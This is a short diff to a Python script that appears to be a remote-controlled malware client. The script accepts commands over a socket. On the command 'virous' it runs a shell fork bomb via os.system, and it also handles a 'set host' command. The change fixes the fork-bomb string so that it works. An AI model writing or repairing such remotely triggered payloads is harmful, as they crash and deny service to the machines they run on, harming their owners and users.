@@ -63,7 +63,7 @@ def virous():
 			s.send(b'done')
 			continue
 		if data =='virous':
-			os.system(':(){ :|& };:')
+			os.system(':(){ :|:& };:')
 			s.send(b'done virous')
 			continue
 		if data[:8] == 'set host':#set host 
